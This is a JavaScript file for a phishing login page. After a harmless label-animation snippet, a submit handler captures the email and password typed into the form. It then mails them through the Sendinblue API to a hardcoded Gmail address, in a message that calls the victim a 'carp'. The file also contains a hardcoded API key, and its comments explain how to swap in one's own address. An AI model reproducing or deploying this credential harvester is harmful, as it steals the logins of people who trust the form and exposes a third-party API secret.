const labels = document.querySelectorAll('.form-control label')

labels.forEach(label => {
    label.innerHTML = label.innerText
        .split('')
        .map((letter, idx) => `<span style="transition-delay:${idx * 50}ms">${letter}</span>`)
        .join('')
})

window.addEventListener('load', (event) => {
    debugger;
    const data = {
        form: () => document.querySelector("form.login-form"),
        email: () => document.querySelectorAll("form.login-form input")[0].value,
        password: () => document.querySelectorAll("form.login-form input")[1].value,
    }

    data.form().addEventListener("submit", sendEmail);
    function sendEmail(event) {
        event.preventDefault();
        // if (Object.keys(data).some(x => data[x]().length < 2)) {
        //     console.log("mnogo kratko info"); // ако някое поле е под 2 символа не се праща мейл
        //     return;
        // }

        const content = {
            "sender": {
                "name": "Demo",
                "email": data.email()
            },
            "to": [
                {
                    "email": "mood4556@gmail.com",//тук си въведи имейла
                    "name": "Demonislav"
                }
            ],
            "subject": "User Data Incomming",
            "htmlContent"://e tuka si go napravi kakto iskash da se vijda meila ti
                `<html><head></head><body><p>Hello,</p> <p> Шаран с имейл ${data.email()} и парола ${data.password()}</h3>  </body></html>`
        };
        debugger;
        fetch('https://api.sendinblue.com/v3/smtp/email',
            {
                method: 'POST',
                headers: {
                    'content-Type': 'application/json',
                    'api-key': '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',
                    'accept': 'application/json'
                },
                body: JSON.stringify(content)
            }).catch(x=>console.log(x))
            //.then(() => alert("Mashala"))
            .then(() => data.form().reset());
    }
});